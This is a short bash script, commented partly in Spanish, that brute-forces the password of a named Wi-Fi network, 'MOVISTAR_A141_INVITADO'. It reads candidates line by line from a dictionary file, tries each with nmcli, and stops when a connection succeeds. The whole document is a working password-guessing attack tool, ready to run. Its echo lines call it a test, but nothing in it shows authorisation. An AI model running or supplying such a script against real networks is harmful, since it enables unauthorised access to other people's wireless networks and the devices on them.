#!/bin/bash

#
# This script is working on:
# Manjaro Linux x86_64
# Shell: bash 5.2.37
#

ssid="MOVISTAR_A141_INVITADO"
password_file="passwords-dictionary.txt"  # Archivo con el listado de contraseñas
attempt=1  # counter

echo "Starting the test connection for SSID: $ssid"
echo "========================================="

# Leer el archivo línea por línea
while IFS= read -r password; do
    echo "Attempt # $attempt: SSID='$ssid', Password='$password'"

    # Intentar conectar
    nmcli dev wifi connect "$ssid" password "$password" &> /dev/null

    # Verificar si la conexión fue exitosa
    if nmcli -t -f active,ssid dev wifi | grep -q "^yes:$ssid$"; then
        echo "¡Connection succefull"
        break
    else
        echo "Wrong password."
    fi

    ((attempt++))  # Incrementar contador de intentos
done < "$password_file"  # Leer desde el archivo

echo "Testing process completed."
